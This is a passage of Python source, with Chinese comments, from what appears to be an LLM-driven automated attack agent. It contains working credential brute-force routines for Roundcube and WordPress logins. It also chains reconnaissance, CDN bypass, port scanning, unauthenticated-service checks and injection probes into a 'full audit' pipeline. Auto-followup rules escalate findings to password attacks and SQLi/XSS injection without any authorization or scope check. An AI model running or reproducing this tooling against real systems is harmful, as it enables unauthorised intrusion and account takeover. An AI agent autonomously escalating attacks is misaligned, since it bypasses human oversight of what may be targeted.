    # _roundcube_brute — Roundcube Webmail 专用爆破
    # ============================================================

    def _roundcube_brute(self, session, url: str, usernames: list,
                          passwords: list, max_attempts: int = 200,
                          token_cache: dict = None) -> object:
        """
        Roundcube Webmail 密码喷射.

        与 phpMyAdmin 不同:
        - 需要 _task=login / _action=login 固定字段
        - 失败: 401 Unauthorized
        - 成功: 302 → /?_task=mail&_mbox=INBOX
        - 没有 is_phpmyadmin 标志
        - token: _token (CSRF, 单次有效)
        """
        from dataclasses import dataclass, field
        from typing import List
        import time

        @dataclass
        class _BruteResult:
            url: str = ""
            username: str = ""
            password: str = ""
            success: bool = False
            status_code: int = 0
            blocked: bool = False
            response_length: int = 0
            time_ms: float = 0.0
            detail: str = ""

        @dataclass
        class _Report:
            url: str = ""
            total_attempts: int = 0
            successful: list = field(default_factory=list)
            blocked: bool = False
            total_time_sec: float = 0.0
            error: str = ""

        import re
        report = _Report(url=url)
        start_time = time.time()
        attempt = 0
        base_url = url.rstrip('/')
        _token = token_cache.get('_token', '') if token_cache else ''

        for user in usernames:
            if attempt >= max_attempts:
                break
            for pwd in passwords:
                attempt += 1
                if attempt > max_attempts:
                    break

                # 每次请求刷新 token (CSRF 保护)
                try:
                    r = session.get(base_url + '/', timeout=8)
                    t = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
                    if t:
                        _token = t.group(1)
                except:
                    time.sleep(1)
                    continue

                data = {
                    '_token': _token,
                    '_task': 'login',
                    '_action': 'login',
                    '_timezone': '_default_',
                    '_url': '',
                    '_user': user,
                    '_pass': pwd,
                }

                try:
                    t0 = time.time()
                    r = session.post(base_url + '/?_task=login', data=data,
                                     timeout=8, allow_redirects=False)
                    ms = round((time.time()-t0)*1000)

                    if r.status_code in (301, 302):
                        loc = r.headers.get('Location', '')
                        if '_task=mail' in loc or 'INBOX' in loc:
                            br = _BruteResult(
                                url=url, username=user, password=pwd,
                                success=True, status_code=r.status_code,
                                time_ms=ms, detail=f"302 → {loc[:60]}",
                            )
                            report.successful.append(br)
                            report.total_attempts = attempt
                            report.total_time_sec = round(time.time()-start_time, 1)
                            return report

                    # 401 = 正常失败, 429/503 = 限速
                    if r.status_code in (429, 503):
                        report.blocked = True
                        time.sleep(5)
                    elif r.status_code == 403:
                        report.blocked = True
                        break

                except Exception as e:
                    time.sleep(1)

                # 进度日志 (每 30 次)
                if attempt % 30 == 0:
                    elapsed = time.time() - start_time
                    rate = attempt / elapsed if elapsed > 0 else 0
                    print(f"    [Roundcube] {attempt}/{max_attempts} "
                          f"({rate:.1f}/s) 当前: {user}:{pwd}")

                time.sleep(0.5)

        report.total_attempts = attempt
        report.total_time_sec = round(time.time()-start_time, 1)
        return report

    # ============================================================
    # _wordpress_brute — WordPress 专用爆破
    # ============================================================

    def _wordpress_brute(self, session, url: str, usernames: list,
                          passwords: list, max_attempts: int = 200) -> object:
        """
        WordPress 登录爆破.

        与 phpMyAdmin 不同:
        - 字段名: log (用户名) / pwd (密码)
        - 失败: 200 + ERROR 消息
        - 成功: 302 → /wp-admin/ 或 dashboard
        - 有 reCAPTCHA 可能需要处理
        """
        from dataclasses import dataclass, field
        from typing import List
        import re, time

        @dataclass
        class _WpResult:
            url: str = ""
            username: str = ""
            password: str = ""
            success: bool = False
            status_code: int = 0
            blocked: bool = False
            response_length: int = 0
            time_ms: float = 0.0
            detail: str = ""

        @dataclass
        class _WpReport:
            url: str = ""
            total_attempts: int = 0
            successful: list = field(default_factory=list)
            blocked: bool = False
            total_time_sec: float = 0.0
            error: str = ""

        report = _WpReport(url=url)
        start_time = time.time()
        attempt = 0

        for user in usernames:
            if attempt >= max_attempts:
                break
            for pwd in passwords:
                attempt += 1
                if attempt > max_attempts:
                    break

                # 获取 wp-login.php 表单字段 (含 hidden)
                try:
                    r = session.get(url, timeout=8)
                    data = {}
                    form = re.search(r'<form[^>]*name="loginform"[^>]*>.*?</form>',
                                     r.text, re.DOTALL | re.I)
                    if form:
                        for inp in re.findall(r'<input[^>]*>', form.group(), re.I):
                            nm = re.search(r'name="([^"]+)"', inp)
                            vl = re.search(r'value="([^"]*)"', inp)
                            if nm:
                                data[nm.group(1)] = vl.group(1) if vl else ''
                    data['log'] = user
                    data['pwd'] = pwd
                    data['wp-submit'] = 'Log In'
                except:
                    time.sleep(1)
                    continue

                try:
                    t0 = time.time()
                    r = session.post(url, data=data, timeout=8, allow_redirects=False)
                    ms = round((time.time()-t0)*1000)

                    # 成功: 302 重定向到 wp-admin
                    if r.status_code in (301, 302):
                        loc = r.headers.get('Location', '')
                        if 'wp-admin' in loc or 'dashboard' in loc:
                            wr = _WpResult(
                                url=url, username=user, password=pwd,
                                success=True, status_code=r.status_code,
                                time_ms=ms, detail=f"302 → {loc[:60]}",
                            )
                            report.successful.append(wr)
                            report.total_attempts = attempt
                            report.total_time_sec = round(time.time()-start_time, 1)
                            return report

                    # 失败检查
                    if r.status_code in (429, 503):
                        report.blocked = True
                        time.sleep(5)
                    elif r.status_code == 403:
                        report.blocked = True
                        break

                except Exception as e:
                    time.sleep(1)

                if attempt % 30 == 0:
                    elapsed = time.time() - start_time
                    rate = attempt / elapsed if elapsed > 0 else 0
                    print(f"    [WordPress] {attempt}/{max_attempts} "
                          f"({rate:.1f}/s) 当前: {user}:{pwd}")

                time.sleep(0.8)

        report.total_attempts = attempt
        report.total_time_sec = round(time.time()-start_time, 1)
        return report

    # ============================================================
    # attack_checklist — 14 维全维度攻击清单
    # ============================================================

    def _action_attack_checklist(self, params: Dict) -> Dict:
        """
        对单个 URL 执行完整 14 维攻击清单.

        给一个 URL, 自动跑完: 信息提取/认证分析/接口枚举/参数发现/权限测试/
        注入探测/CVE 匹配/配置文件/方法切换/目录发现/业务逻辑/响应差异/
        请求结构分析/会话交互分析.

        这是"不靠弱密码"的系统性方法论 — 不再是"你提醒什么我做什么".
        """
        url = params.get("url", "")
        if not url:
            return {"ok": False, "error": "缺少 url"}

        cookies = params.get("cookies", "")
        proxy = ""
        if self.proxy_manager:
            try:
                proxy = self.proxy_manager.get_proxy() or ""
            except Exception:
                proxy = ""

        try:
            from .traffic.attack_checklist import AttackChecklist
            checklist = AttackChecklist(url, cookies=cookies, proxy=proxy)
            results = checklist.run()
        except Exception as e:
            return {"ok": False, "error": f"checklist 执行失败: {e}"}

        # 按严重度分类
        critical = [r for r in results if r.severity == "critical"]
        high = [r for r in results if r.severity == "high"]
        medium = [r for r in results if r.severity == "medium"]

        # 累积到上下文 — Agent 记住这个目标跑过清单了
        self._add_to_context("attack_checklist", url, {
            "total": len(results),
            "critical": len(critical),
            "high": len(high),
            "dimensions_run": 14,
        })

        # 自动跟进: critical/high 发现 → 触发针对性深扫
        followups = []
        for r in critical + high:
            if r.dimension == "认证分析" and "JWT" in r.check_name:
                followups.append(("jwt_analyze", {"token": r.evidence}))
            elif r.dimension == "CVE匹配":
                followups.append(("exploit", {"cve": r.check_name, "target": url}))
            elif r.dimension == "配置文件" and any(k in r.check_name for k in ['.git', '.env', 'config']):
                followups.append(("logic_scan", {"url": r.target}))
            elif r.dimension == "注入探测" and any(k in r.check_name for k in ['SQLi']):
                followups.append(("inject", {"url": url, "types": ["sqli", "xss"]}))

        return {
            "ok": True,
            "summary": f"url={url} 维度=14 总发现={len(results)} "
                      f"严重={len(critical)} 高危={len(high)} 中危={len(medium)}",
            "data": {
                "critical": [{"dim": r.dimension, "check": r.check_name,
                              "target": r.target, "evidence": r.evidence,
                              "recommendation": r.recommendation}
                             for r in critical],
                "high": [{"dim": r.dimension, "check": r.check_name,
                          "target": r.target, "evidence": r.evidence,
                          "recommendation": r.recommendation}
                         for r in high[:15]],
                "medium": [{"dim": r.dimension, "check": r.check_name,
                            "target": r.target}
                           for r in medium[:10]],
                "followups_suggested": len(followups),
            },
            "_followups": followups[:5],
        }

    # ============================================================
    # supply_chain — 供应链攻击编排
    # ============================================================

    async def _action_supply_chain(self, params: Dict) -> Dict:
        """
        对目标域名执行供应链攻击编排流程.

        Args:
            params.domain: 目标域名
            params.quick: (可选) 快速模式, 只做面板检测

        Returns:
            {"ok": bool, "summary": str, "data": {...}}
        """
        from urllib.parse import urlparse

        domain = params.get("domain", "")
        if not domain:
            url = params.get("url", "")
            domain = urlparse(url).netloc or url
        if not domain:
            return {"ok": False, "error": "缺少 domain 或 url 参数"}

        quick = params.get("quick", False)
        findings = {}

        try:
            if not quick:
                # 1. CDN Bypass
                from .traffic.cdn_bypass import CDNBypass
                bypass = CDNBypass()
                cdn_result = await bypass.bypass(domain)
                findings["cdn_bypass"] = {
                    "is_cdn": cdn_result.is_cdn,
                    "cdn_name": cdn_result.cdn_name,
                    "cdn_ips": cdn_result.cdn_ips,
                    "origin_candidates": [c.to_dict() for c in cdn_result.origin_candidates],
                }
                self._add_to_context("supply_chain", f"{domain}_cdn", findings["cdn_bypass"])

                # 2. Asset Expansion
                from .traffic.asset_expander import AssetExpander
                expander = AssetExpander()
                expand_result = await expander.expand(domain)
                findings["asset_expand"] = {
                    "subdomains": expand_result.subdomains[:20],
                    "ips": expand_result.ips,
                    "neighbors": expand_result.neighbors[:10],
                    "c_segment": expand_result.c_segment,
                }
                self._add_to_context("supply_chain", f"{domain}_assets", findings["asset_expand"])

            # 3. Panel Detection (必做) — V4 修复: 走 _get_http_session()
            from .traffic.hosting_panel_detect import detect_panels

            session = self._get_http_session()

            panel_result = detect_panels(f"https://{domain}", session=session)
            panels = []
            for p in panel_result.panels:
                panels.append({
                    "panel_type": p.panel_type,
                    "version": p.version,
                    "login_url": p.login_url,
                    "confidence": p.confidence,
                })
            findings["panels"] = panels
            if panels:
                self._add_to_context("supply_chain", f"{domain}_panels",
                                   {"count": len(panels), "types": [p["panel_type"] for p in panels]})
            session.close()

            # 构造摘要
            summary_parts = []
            if findings.get("cdn_bypass", {}).get("origin_ip"):
                summary_parts.append(f"源IP: {findings['cdn_bypass']['origin_ip']}")
            if findings.get("asset_expand", {}).get("subdomains"):
                summary_parts.append(f"子域名: {len(findings['asset_expand']['subdomains'])}个")
            if panels:
                summary_parts.append(f"面板: {len(panels)}个")
            summary = f"{domain} 供应链扫描完成: {'; '.join(summary_parts) if summary_parts else '未发现关键信息'}"

            return {
                "ok": True,
                "summary": summary,
                "data": findings,
            }

        except ImportError as e:
            return {"ok": False, "error": f"导入失败: {e}"}
        except Exception as e:
            return {"ok": False, "error": f"supply_chain 执行异常: {e}"}

    # ============================================================
    # detect_panel — 主机面板指纹识别
    # ============================================================

    def _action_detect_panel(self, params: Dict) -> Dict:
        """
        对目标 URL 检测主机管理面板 (cPanel/WHM/Plesk/DirectAdmin/Webmin/...).

        V4 ALL-IN-TRAFFIC: 不再单独起 requests.Session,
        走共享 self.engine 的 HTTP adapter (代理/连接池/journal 一致).
        """
        url = params.get("url", "")
        if not url:
            return {"ok": False, "error": "缺少 url 参数"}

        try:
            from .traffic.hosting_panel_detect import detect_panels

            # V4 修复: _client 是 httpx.AsyncClient, 不能当同步 session 用。
            # 统一走 _get_http_session() 获取真正的同步 requests.Session。
            session = self._get_http_session()

            try:
                result = detect_panels(url, session=session)

                panels = []
                for p in result.panels:
                    panels.append({
                        "panel_type": p.panel_type,
                        "version": p.version,
                        "login_url": p.login_url,
                        "confidence": p.confidence,
                        "detect_method": p.detect_method,
                    })
                    self._add_to_context("panels", p.login_url, {
                        "panel_type": p.panel_type,
                        "version": p.version,
                    })

                if panels:
                    types = [p["panel_type"] for p in panels]
                    summary = (f"✅ {url} 发现 {len(panels)} 个面板: "
                              + ", ".join(types[:5]))
                else:
                    summary = f"❌ {url} 未检测到已知面板"

                return {
                    "ok": True,
                    "summary": summary,
                    "data": {
                        "url": url,
                        "total_checked": result.total_checked,
                        "total_time_sec": result.total_time_sec,
                        "panels": panels,
                    },
                }
            finally:
                session.close()

        except ImportError as e:
            return {"ok": False, "error": f"导入失败: {e}"}
        except Exception as e:
            return {"ok": False, "error": f"detect_panel 执行异常: {e}"}

    # ============================================================
    # start_listener — 启动流量采集器 (Burp 式 MITM 代理)
    # ============================================================

    def _action_start_listener(self, params: Dict) -> Dict:
        """
        启动 Burp 式流量采集器.

        启动后, 所有配置了代理到 localhost:PORT 的浏览器/工具流量
        自动进入 TrafficJournal, 供 LLM 观察和分析.

        Args:
            params.port: (可选) 代理端口, 默认 8080
            params.host: (可选) 监听地址, 默认 127.0.0.1

        Returns:
            {"ok": bool, "summary": str, "data": {...}}
        """
        port = params.get("port", 8080)
        host = params.get("host", "127.0.0.1")

        # 如果已有运行中的采集器, 返回状态
        existing = getattr(self, '_traffic_collector', None)
        if existing and existing.is_running:
            return {
                "ok": True,
                "summary": f"采集器已在运行于 {existing.host}:{existing.port}",
                "data": existing.get_status(),
            }

        try:
            from .traffic.traffic_collector import TrafficCollector

            collector = TrafficCollector(
                port=port,
                host=host,
                journal=self.journal,
            )
            result = collector.start()

            if result.get("success"):
                self._traffic_collector = collector
                self._add_to_context("listener", f"port_{port}", {
                    "status": "running",
                    "port": port,
                })
                return {
                    "ok": True,
                    "summary": result["message"],
                    "data": collector.get_status(),
                }
            else:
                return {"ok": False, "error": result["message"]}

        except Exception as e:
            return {"ok": False, "error": f"start_listener 执行异常: {e}"}

    # ============================================================
    # observe — 观察流量采集数据, 不主动发包
    # ============================================================

    def _action_observe(self, params: Dict) -> Dict:
        """
        观察当前流量采集数据.

        从 TrafficJournal 读取最近流量 + 模式发现 + 被动分析,
        但不主动发送任何请求. 供 LLM 基于已有流量决定下一步.

        Args:
            params.last_n: (可选) 取最近 N 条, 默认 30
            params.analyze: (可选) 是否执行被动分析, 默认 True

        Returns:
            {"ok": bool, "summary": str, "data": {...}}
        """
        last_n = params.get("last_n", 30)
        do_analyze = params.get("analyze", True)

        # 优先从采集器读取
        collector = getattr(self, '_traffic_collector', None)
        if collector and collector.is_running:
            try:
                summary = collector.get_summary(last_n=last_n)
                patterns = collector.detect_patterns(window=last_n)

                result_data = {
                    "collector_status": collector.get_status(),
                    "patterns": patterns,
                }

                if do_analyze:
                    analysis = collector.analyze_traffic()
                    result_data["analysis"] = analysis

                result_data["summary"] = summary

                return {
                    "ok": True,
                    "summary": f"观察到 {collector.stats.total_captured} 条流量, "
                              f"{len(patterns)} 个模式",
                    "data": result_data,
                }
            except Exception as e:
                return {"ok": False, "error": f"observe 异常: {e}"}

        # 回退: 从 journal 直接读取
        try:
            if self.journal and len(self.journal) > 0:
                summary = self.journal.llm_summary(last_n=last_n)
                patterns = self.journal.detect_patterns(window=last_n)
                return {
                    "ok": True,
                    "summary": f"从 journal 观察到 {len(self.journal)} 条流量, "
                              f"{len(patterns)} 个模式",
                    "data": {
                        "summary": summary,
                        "patterns": patterns,
                        "journal_size": len(self.journal),
                    },
                }
            else:
                return {
                    "ok": True,
                    "summary": "暂无流量数据, 请先用 start_listener 启动采集器",
                    "data": {"journal_size": 0},
                }
        except Exception as e:
            return {"ok": False, "error": f"observe 异常: {e}"}

    # ============================================================
    # full_audit — 端到端全自动审计 (一个目标打到底)
    # ============================================================

    async def _action_full_audit(self, params: Dict) -> Dict:
        """
        端到端全自动审计 — V4 ALL-IN-TRAFFIC 流量瀑布.

        给一个域名/IP, 自动完成 4 阶段流量瀑布:
            Phase 0: 资产扩张 (subdomain/旁站/C段) — DNS 协议探针
            Phase 1: 多协议端口探测 (Redis/SSH/Docker/...) — TCP/UDP 探活
            Phase 2: 协议指纹 + 智能标签 (IntentAnalyzer)
            Phase 3: 协议定向攻击
                     - HTTP 目标 → 14 维 attack_checklist
                     - 高危服务 (Redis/SSH/Docker/MySQL) → 未授权检测
                     - 发现登录面 (phpMyAdmin/wp-login) → login_brute

        整条瀑布走共享 self.engine — 代理/连接池/journal 状态一致.
        """
        target = params.get("target", params.get("url", ""))
        if not target:
            return {"ok": False, "error": "缺少 target (域名/IP/URL)"}

        all_findings = {
            "assets": [], "open_ports": [], "protocol_fingerprints": [],
            "checklist_results": [], "unauth_results": [],
            "login_targets": [],
            "critical": [], "high": [],
            "traffic_waterfall": [],  # 每阶段产物
        }

        # 标准化 target — 域名/IP/URL 都接受
        is_url = target.startswith("http://") or target.startswith("https://")
        host = target
        if is_url:
            from urllib.parse import urlparse
            host = urlparse(target).hostname or target
        all_findings["traffic_waterfall"].append({
            "phase": 0, "name": "target_normalize",
            "input": target, "host": host,
        })

        # ==================== Phase 0: 资产扩张 (DNS 协议探针) ====================
        try:
            expand_result = await self._action_asset_expand(
                {"domain": host} if not is_url else {"url": target}
            )
            if expand_result.get("ok"):
                subs = expand_result.get("data", {}).get("subdomains", [])
                all_findings["assets"] = subs[:30]
                all_findings["traffic_waterfall"].append({
                    "phase": 0, "name": "asset_expand",
                    "result": f"subdomains={len(subs)}",
                })
        except Exception as e:
            all_findings["traffic_waterfall"].append({
                "phase": 0, "name": "asset_expand", "error": str(e)[:80],
            })

        # ==================== Phase 1: 多协议端口探测 ====================
        try:
            # 1a. 收集要扫的 host (目标 + 资产扩张出来的子域)
            scan_hosts = [host]
            for sub in all_findings["assets"][:5]:
                if isinstance(sub, str):
                    scan_hosts.append(sub)

            # 1b. 跑多协议扫描 (走共享 engine)
            scan_result = await self._action_traffic_scan({
                "hosts": scan_hosts,
                "ports": "top-50",
                "concurrency": 30,
            })
            if scan_result.get("ok"):
                all_findings["open_ports"] = scan_result.get("high_value_assets", [])[:50]
                all_findings["traffic_waterfall"].append({
                    "phase": 1, "name": "multi_protocol_scan",
                    "result": f"open={scan_result.get('total_open')} "
                              f"high_value={scan_result.get('total_high_value')}",
                })
        except Exception as e:
            all_findings["traffic_waterfall"].append({
                "phase": 1, "name": "multi_protocol_scan", "error": str(e)[:80],
            })

        # ==================== Phase 2: HTTP 目标协议指纹 ====================
        http_targets = set()
        if is_url:
            http_targets.add(target)
        for port_info in all_findings["open_ports"]:
            if isinstance(port_info, dict):
                svc = port_info.get("service", "").lower()
                h = port_info.get("host", host)
                if svc in ("http", "https") and h:
                    http_targets.add(f"{svc}://{h}")
                elif h and port_info.get("port") in (80, 8080, 8000, 3000):
                    http_targets.add(f"http://{h}")
                elif h and port_info.get("port") in (443, 8443):
                    http_targets.add(f"https://{h}")

        # 用 smart_probe 拿指纹 (IntentAnalyzer 自动打 HIGH-VALUE 等标签)
        for url in list(http_targets)[:5]:
            try:
                probe = await self._action_traffic_probe({"target": url, "timeout": 5})
                if probe.get("ok"):
                    all_findings["protocol_fingerprints"].append({
                        "url": url,
                        "protocol": probe.get("data", {}).get("protocol"),
                        "banner": probe.get("data", {}).get("banner", "")[:80],
                        "tags": probe.get("data", {}).get("tags", []),
                    })
            except Exception:
                continue
        all_findings["traffic_waterfall"].append({
            "phase": 2, "name": "http_fingerprint",
            "result": f"fingerprinted={len(all_findings['protocol_fingerprints'])}",
        })

        # ==================== Phase 3: 协议定向攻击 ====================

        # 3a. HTTP 目标 → 14 维 attack_checklist
        for url in list(http_targets)[:5]:
            try:
                cl_result = self._action_attack_checklist({"url": url})
                if cl_result.get("ok"):
                    all_findings["checklist_results"].append({
                        "url": url,
                        "critical": cl_result["data"]["critical"],
                        "high": cl_result["data"]["high"][:5],
                    })
                    all_findings["critical"].extend(
                        {"url": url, **c} for c in cl_result["data"]["critical"]
                    )
                    all_findings["high"].extend(
                        {"url": url, **h} for h in cl_result["data"]["high"][:3]
                    )
                    # 检测登录面 → 自动跟进 login_brute
                    all_mentions = str(cl_result.get("data", "")).lower()
                    if "phpmyadmin" in all_mentions or "phpmyadmin" in url.lower():
                        all_findings["login_targets"].append(url)
                    elif "wp-login" in all_mentions or "wordpress" in all_mentions:
                        all_findings["login_targets"].append(url)
            except Exception:
                continue

        # 3b. 高危服务 → 未授权检测
        for port_info in all_findings["open_ports"]:
            if isinstance(port_info, dict):
                svc = port_info.get("service", "").lower()
                h = port_info.get("host", "")
                p = port_info.get("port", "")
                if svc in ("redis", "docker", "kubelet", "mysql", "ssh", "smb", "mongodb") and h:
                    try:
                        unauth = await self._action_check_unauth(
                            {"target": f"{h}:{p}"}
                        )
                        if unauth.get("ok"):
                            all_findings["unauth_results"].append({
                                "target": f"{h}:{p}",
                                "service": svc,
                                "result": unauth.get("summary", ""),
                            })
                    except Exception:
                        continue

        all_findings["traffic_waterfall"].append({
            "phase": 3, "name": "targeted_attack",
            "result": f"checklist={len(all_findings['checklist_results'])} "
                      f"unauth={len(all_findings['unauth_results'])} "
                      f"login_targets={len(all_findings['login_targets'])}",
        })

        # ==================== 汇总 ====================
        return {
            "ok": True,
            "summary": (f"目标={target} 资产={len(all_findings['assets'])} "
                       f"开放端口={len(all_findings['open_ports'])} "
                       f"HTTP清单={len(all_findings['checklist_results'])} "
                       f"未授权={len(all_findings['unauth_results'])} "
                       f"严重={len(all_findings['critical'])} "
                       f"高危={len(all_findings['high'])}"),
            "data": all_findings,
        }

    # ============================================================
    # 上下文累积 (记住之前发现了什么)
    # ============================================================

    def _add_to_context(self, category: str, key: str, value: dict):
        """累积上下文 — Agent 记住之前发现了什么资产"""
        if not hasattr(self, "_discovered"):
            self._discovered = {}
        self._discovered.setdefault(category, {})[key] = value

    def _get_context_summary(self) -> str:
        """生成已发现资产的摘要 (喂给 LLM)"""
        if not hasattr(self, "_discovered") or not self._discovered:
            return ""

        lines = ["### 已发现资产累积:\n"]
        for category, items in self._discovered.items():
            if items:
                lines.append(f"**{category}** ({len(items)}):")
                for key, val in list(items.items())[:5]:
                    if isinstance(val, dict):
                        summary = str(val.get("summary", val.get("ip", val.get("isp", ""))))[:50]
                    else:
                        summary = str(val)[:50]
                    lines.append(f"  - {key}: {summary}")
        return "\n".join(lines) + "\n"

    def _check_auto_followup(self, action: Dict, result: Dict) -> List[tuple]:
        """
        A-6: 自动跟进 — 发现高危时自动触发深度检测.

        规则:
            traffic_scan 发现 Redis/SSH/Docker → 自动 check_unauth
            traffic_scan 发现 HTTP → 自动 traffic_analyze
            traffic_analyze 发现 JWT → 自动 jwt_analyze
            traffic_probe 发现 HIGH-VALUE → 自动 check_unauth
            attack_checklist 发现注入迹象 → 自动 inject
        """
        followups = []
        action_type = action.get("action", "")
        data = result.get("data", result)

        # 规则 1: traffic_scan 发现高危服务 → check_unauth
        if action_type == "traffic_scan":
            hv_assets = data.get("high_value_assets", [])
            for asset in hv_assets[:3]:
                target = asset.get("target", "")
                proto = asset.get("protocol", asset.get("service", ""))
                if proto in ("redis", "docker", "kubelet", "mysql", "ssh", "smb"):
                    followups.append(("check_unauth", {"target": target}))

        # 规则 2: traffic_probe 发现 HIGH-VALUE
        elif action_type == "traffic_probe":
            tags = data.get("tags", [])
            target = action.get("params", {}).get("target", "")
            if "HIGH-VALUE" in tags or "UNAUTH-CHECK" in tags:
                followups.append(("check_unauth", {"target": target}))

        # 规则 3: traffic_analyze 发现 JWT
        elif action_type == "traffic_analyze":
            findings = data.get("data", data.get("findings", []))
            for f in findings:
                if isinstance(f, dict) and f.get("type") == "jwt-token":
                    evidence = f.get("evidence", "")
                    if "eyJ" in evidence:
                        followups.append(("jwt_analyze", {"token": evidence.split("eyJ")[1][:50]}))
                    break

        # 规则 4: 任何 HTTP 目标探活成功 → 自动跑 14 维攻击清单
        if action_type in ("traffic_probe", "probe"):
            target = action.get("params", {}).get("target", action.get("params", {}).get("url", ""))
            if target and ":" in target and not target.startswith("http"):
                host, _, port = target.partition(":")
                try:
                    p = int(port)
                except ValueError:
                    p = 0
                if p in (80, 8080, 8000, 3000):
                    target = f"http://{target}"
                elif p in (443, 8443):
                    target = f"https://{target}"
                else:
                    target = ""
            if target.startswith("http"):
                followups.append(("attack_checklist", {"url": target}))

# 规则 7: attack_checklist 发现 phpMyAdmin / wp-login → 自动 login_brute
        elif action_type == "attack_checklist":
            url = action.get("params", {}).get("url", "")
            data = result.get("data", {})
            # 先收集原始跟进 (注入建议等)
            for fu in result.get("_followups", [])[:3]:
                followups.append(fu)
            # 如果清单发现了参数化的目标, 自动 inject
            for item in data.get("high", []) + data.get("medium", []):
                if isinstance(item, dict):
                    target_url = item.get("target", item.get("url", ""))
                    if "?" in target_url and "=" in target_url.split("?", 1)[1]:
                        followups.append(("inject", {"url": target_url}))
                        break
            # 如果注入探测维度发现了任何发现, 自动 inject
            high_items = data.get("high", [])
            if any(r.get("dim") == "注入探测" for r in high_items):
                followups.append(("inject", {"url": url,
                                            "types": ["sqli", "xss", "host-inject", "method-override"]}))
            # phpMyAdmin / wp-login 检测 → login_brute
            all_mentions = str(data).lower()
            if "phpmyadmin" in all_mentions or (url and "phpmyadmin" in url.lower()):
                followups.append(("login_brute", {"url": url}))
            elif "wp-login" in all_mentions or "wordpress login" in all_mentions:
                followups.append(("login_brute", {"url": url}))

        # 规则 6: inject 自己建议的 followups
        elif action_type == "inject":
            for fu in result.get("_followups", [])[:3]:
                followups.append(fu)

        return followups

    # ============================================================
    async def _action_traffic_probe(self, params: Dict) -> Dict:
        """
        多协议探活 action (V4).
        LLM 输出: {"action": "traffic_probe", "params": {"target": "10.0.0.1:6379"}}
        支持: host:port 自动路由到对应协议 (redis/docker/kubelet/mysql/smb/...)
        走共享 self.engine — 协议探针 + IntentAnalyzer 一气呵成.
        """
        target = params.get("target")
        if not target:
            return {"ok": False, "error": "缺少 target (host:port 或 URL)"}

        timeout = params.get("timeout", 5)

        async def _probe(engine):
            return await engine.smart_probe(target, timeout=timeout)

        try:
            resp = await self._run_with_engine(_probe)
        except Exception as e:
            return {"ok": False, "error": f"probe 失败: {str(e)[:100]}"}

        # 写入 context (智能标签)
        if resp.ok:
            self._add_to_context("traffic_probe", target, {
                "protocol": resp.protocol,
                "banner": resp.banner[:60],
                "tags": resp.tags[:6],
            })

        return {
            "ok": resp.ok,
            "data": resp.to_dict(),
            "summary": (f"target={target} protocol={resp.protocol} "
                        f"ok={resp.ok} banner={resp.banner} "
                        f"tags={resp.tags}"),
        }

    async def _action_traffic_scan(self, params: Dict) -> Dict:
        """
        批量端口扫描 action (V4) — 升级为"多协议探针 + 智能标签".

        LLM 输出:
            {"action": "traffic_scan", "params": {"cidr": "10.0.0.0/24", "ports": [22,80,6379]}}
            {"action": "traffic_scan", "params": {"hosts": ["10.0.0.1","10.0.0.2"], "ports": "top-50"}}
            {"action": "traffic_scan", "params": {"target": "example.com", "ports": "top-50"}}

        走共享 self.engine — Phase 2.1 升级:
            1) 标准化 hosts (接受 cidr/hosts/target/domain)
            2) engine.scan_cidr / scan_hosts 跑多协议探活
            3) IntentAnalyzer 自动打 HIGH-VALUE / UNAUTH / RCE 标签
            4) 过滤 high_value_assets 写回 context, 触发自动跟进
        """
        # 标准化 hosts
        cidr = params.get("cidr")
        hosts = params.get("hosts")
        ports = params.get("ports")
        concurrency = params.get("concurrency", 50)
        timeout = params.get("timeout", 3)

        if not cidr and not hosts:
            # 兼容老格式: {"target": "example.com", "ports": ...}
            target_fallback = params.get("target", "")
            if target_fallback:
                # 域名/IP 都接受, URL 抽 host
                t = target_fallback
                if t.startswith("http://") or t.startswith("https://"):
                    from urllib.parse import urlparse
                    t = urlparse(t).hostname or t
                hosts = [t]
            else:
                return {"ok": False, "error": "缺少 cidr / hosts / target"}

        async def _scan(engine):
            if cidr:
                return await engine.scan_cidr(
                    cidr, ports=ports, concurrency=concurrency, timeout=timeout
                )
            return await engine.scan_hosts(
                hosts, ports=ports, concurrency=concurrency, timeout=timeout
            )

        try:
            result = await self._run_with_engine(_scan)
        except Exception as e:
            return {"ok": False, "error": f"scan 失败: {str(e)[:100]}"}

        summary = result.summary()
        hv_entries = [e.to_dict() for e in result.high_value_entries()[:20]]

        # 写回 context, 触发 _check_auto_followup
        for e in result.high_value_entries()[:10]:
            self._add_to_context("traffic_scan", e.target, {
                "protocol": e.protocol,
                "service": e.service,
                "tags": e.tags,
            })

        return {
            "ok": True,
            "summary": summary,
            "high_value_assets": hv_entries,
            "total_open": summary["open_count"],
            "total_high_value": summary["high_value_count"],
        }

    # ============================================================
    # V4 三段论: Phase ①②③④ 方法
    # ============================================================

    # --- Phase ①: 打点编排 ---

    async def _run_phase1_auto(self, target: str) -> Dict:
        """
        Phase ① 自动编排: 按顺序跑打点 action, 合并产出到 AssetInventory。
        """
        import time as _time
        from .traffic.asset_schema import AssetInventory, AssetItem

        inventory = AssetInventory(target=target)
        self._phase = 0

        # 1. 资产扩展 (子域名/旁站/C段)
        try:
            expand = await self._action_asset_expand({"domain": target})
            # subdomains/ips 是 dict 列表 (AssetNode.__dict__), 每个含 "value" 键
            for sub in (expand.get("data", {}) or {}).get("subdomains", []):
                val = sub.get("value", "") if isinstance(sub, dict) else str(sub)
                if val:
                    inventory.add(AssetItem(
                        type="subdomain", value=val, source="asset_expand",
                        confidence=0.8, tags=["http"],
                    ))
            for ip in (expand.get("data", {}) or {}).get("ips", []):
                val = ip.get("value", "") if isinstance(ip, dict) else str(ip)
                if val:
                    inventory.add(AssetItem(
                        type="ip", value=val, source="asset_expand",
                        confidence=0.8, tags=["ip"],
                    ))
        except Exception:
            pass

        # 2. CDN 绕过 (找源 IP)
        try:
            cdn = await self._action_cdn_bypass({"domain": target})
            # CDNCheckResult.to_dict() 的键: is_cdn, origin_candidates (非 origin_ip)
            cdn_data = cdn.get("data", {}) or {}
            for cand in cdn_data.get("origin_candidates", []):
                if isinstance(cand, dict) and cand.get("confidence") == "high":
                    ip = cand.get("ip", "")
                    if ip:
                        inventory.add(AssetItem(
                            type="ip", value=ip, source="cdn_bypass",
                            confidence=0.9, tags=["origin", "cdn-bypass"],
                        ))
                        break  # 只取第一个高置信度
        except Exception:
            pass

        # 3. 端口扫描
        try:
            scan = await self._action_traffic_scan({"target": target})
            for host_info in (scan.get("high_value_assets", []) or []):
                # host_info 是 AssetEntry.to_dict(), target 已是 "host:port"
                target_val = host_info.get("target", "")
                if not target_val:
